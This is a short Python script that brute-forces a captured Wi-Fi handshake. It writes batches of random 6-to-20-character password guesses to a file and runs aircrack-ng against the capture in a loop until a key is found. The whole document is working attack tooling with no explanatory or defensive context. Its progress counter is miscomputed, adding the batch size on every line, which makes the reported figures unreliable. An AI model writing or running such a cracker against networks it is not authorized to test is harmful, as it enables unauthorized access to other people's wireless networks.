#!/usr/bin/env python3

import random
import subprocess
import sys
import os
import logging

logging.basicConfig(level=logging.INFO)  # Changed to INFO for more visibility
file_path = "test.txt"

n = 0

def check_password():
    command = f"aircrack-ng {sys.argv[1]} -w {file_path}".split()
    try:
        process = subprocess.check_output(command, text=True ,stderr=subprocess.DEVNULL)
        if "KEY NOT FOUND" not in process:
            print(process)
            exit()
        else:
            print(process)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error executing aircrack-ng: {e.output}")

def progress(n):
    sys.stdout.write(f"\r[*] {n:,} passwords tried ")
    sys.stdout.flush()

def guess():
    listX = list("0123456789abcdefghijklmnopqrstuvwxyz_@#ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    guess_password = random.choices(listX, k=random.randint(6, 20))
    return "".join(guess_password)

def main():
    global n 
    with open(file_path, "w") as file:
        for _ in range(int(sys.argv[-1])):
            file.write(guess() + "\n")  # Writing each guess on a new line
            n += int(sys.argv[-1])
            progress(n)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {__file__.split('/')[-1]} capturefile (no of passwords)")
        exit()

    print(f"[*] Starting to brute-force {sys.argv[1]}")
    try:
        while True:
            main()
            check_password()
    except KeyboardInterrupt:
        print("[+] Exiting ....")
        if os.path.exists(file_path):
            os.remove(file_path)
            pass
        exit()
    except Exception as e:
        logging.error(f"An error occurred: {e}")
